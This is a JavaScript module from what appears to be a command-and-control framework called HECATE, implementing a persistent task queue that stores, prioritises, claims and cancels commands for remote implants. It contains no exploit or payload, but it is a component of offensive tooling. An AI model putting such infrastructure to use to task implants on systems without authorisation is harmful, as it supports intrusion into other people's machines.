'use strict';

/** Durable C2 task queue backed by c2_tasks. The queue is no longer process-memory
 * state, so queued work survives a HECATE restart. No key/secret handling lives here. */
const { randomUUID } = require('crypto');
const { TASK_TYPES } = require('./protocol');
const c2Store = require('../storage/c2-store');
const HIGH_PRIORITY = new Set([TASK_TYPES.DIE, TASK_TYPES.SLEEP]);

function enqueue(implantId, type, payload = {}, urgent = false) {
  const task = {
    id: randomUUID(), implantId, type, payload,
    status: 'queued', createdAt: new Date().toISOString(), claimedAt: null,
    priority: urgent || HIGH_PRIORITY.has(type) ? 1 : 0,
  };
  c2Store.enqueueTask(task);
  return task;
}

function claim(implantId, max = 10) {
  return c2Store.claimTasks(implantId, max);
}
function peek(implantId) { return c2Store.listTasks(implantId, 'queued'); }
function size(implantId) { return peek(implantId).length; }
function clearQueue(implantId) { return c2Store.cancelQueuedTasks(implantId); }
function clearAll() { return c2Store.cancelAllQueuedTasks(); }
function cancel(implantId, taskId) { return c2Store.cancelQueuedTask(implantId, taskId); }
module.exports = { enqueue, claim, peek, size, clearQueue, clearAll, cancel };
